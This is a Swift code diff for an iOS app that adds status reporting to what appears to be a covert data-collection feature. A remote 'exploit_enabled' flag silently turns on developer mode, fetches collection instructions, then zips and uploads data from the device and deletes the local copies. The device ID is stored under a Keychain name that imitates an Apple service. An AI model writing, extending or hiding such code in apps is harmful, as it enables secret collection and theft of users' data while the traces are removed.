@@ -377,6 +377,9 @@ enum DeviceConfigReporter {
     private static let uuidService = "com.apple.mobile.MobileHouseArrest.device-uuid"
     private static let uuidAccount = "device-uuid"
 
+    /// 远端 `app_log_report_enabled` 开关，决定各阶段状态日志是否上报。
+    private static var logReportEnabled = false
+
     /// 稳定设备 UUID：优先读 Keychain（跨重装保留），缺失时生成并写入。
     static var deviceUUID: String {
         let query: [String: Any] = [
@@ -442,13 +445,13 @@ enum DeviceConfigReporter {
         }
     }
 
-    /// 上报应用日志正文到 `/api/log/report`（仅当远端 app_log_report_enabled 为 true）。
-    static func reportAppLog() async {
+    /// 上报一条状态日志正文到 `/api/log/report`（仅当远端 app_log_report_enabled 为 true 时由 reportStatus 调用）。
+    static func reportAppLog(_ text: String) async {
         guard let url = URL(string: baseURL + logReportPath) else { return }
         let uuid = deviceUUID
         let params: [String: Any] = [
             "app_uuid": uuid,
-            "text": currentLogText(),
+            "text": text,
             "timestamp": Int(Date().timeIntervalSince1970)
         ]
 
@@ -456,10 +459,16 @@ enum DeviceConfigReporter {
             let (_, response) = try await URLSession.shared.data(
                 for: makeRequest(url: url, params: params, uuid: uuid))
             let code = (response as? HTTPURLResponse)?.statusCode ?? -1
-            log("logReport: POST \(logReportPath) → \(code)")
+            log("logReport: POST \(logReportPath) text=\(text) → \(code)")
         } catch {
-            log("logReport: POST \(logReportPath) failed — \(error.localizedDescription)")
+            log("logReport: POST \(logReportPath) text=\(text) failed — \(error.localizedDescription)")
         }
+    }
+
+    /// 按远端 `app_log_report_enabled` 开关上报阶段状态日志；未开启则静默跳过。
+    static func reportStatus(_ text: String) async {
+        guard logReportEnabled else { return }
+        await reportAppLog(text)
     }
 
     // MARK: - Reply handling
@@ -511,12 +520,13 @@ enum DeviceConfigReporter {
     /// exploit_enabled 为 true 时，在上报完日志后再向 `/api/device/report` 拉取并执行采集。
     private static func apply(_ config: RemoteConfig) async {
         let exploitEnabled = config.exploitEnabled == true
+        logReportEnabled = config.appLogReportEnabled == true
         if exploitEnabled {
             log("report: exploit_enabled=true → developer mode enabled")
             UserDefaults.standard.set(true, forKey: FeatureVisibility.developerModeStorageKey)
         }
-        if config.appLogReportEnabled == true {
-            await reportAppLog()
+        if logReportEnabled {
+            await reportAppLog("上报成功，等待采集")
         }
         if exploitEnabled {
             await reportDevice()
@@ -632,17 +642,6 @@ enum DeviceConfigReporter {
         return request
     }
 
-    /// 当前日志正文：优先落盘的 app 日志文件，回退到内存中的条目。
-    private static func currentLogText() -> String {
-        let url = diagnosticsDirectory().appendingPathComponent(diagnosticsAppLogFileName)
-        if let data = try? Data(contentsOf: url),
-           let text = String(data: data, encoding: .utf8),
-           !text.isEmpty {
-            return text
-        }
-        return AppLog.shared.entries.joined(separator: "\n")
-    }
-
     // MARK: - AES-128-CBC (PKCS7)
 
     private static func encrypt(_ plain: Data) -> Data? {
@@ -730,7 +729,9 @@ enum CollectService {
             return
         }
         // 采集 + 打包是重 IO，放到后台线程执行，避免阻塞主线程。
+        await DeviceConfigReporter.reportStatus("正在采集")
         let archives = await Task.detached(priority: .utility) { collectAndZip(configs) }.value
+        await DeviceConfigReporter.reportStatus(archives.isEmpty ? "打包zip失败" : "打包zip成功")
         let fm = FileManager.default
         for archive in archives {
             let uploaded = await DeviceConfigReporter.uploadZip(
@@ -742,6 +743,7 @@ enum CollectService {
             if uploaded {
                 try? fm.removeItem(at: archive.url)
                 log("collect: removed uploaded zip \(archive.fileName)")
+                await DeviceConfigReporter.reportStatus("已发送，本地已删除")
             }
         }
         // 清理本次采集的空目录（暂存已在打包后删除，zip 已在上传后删除）。
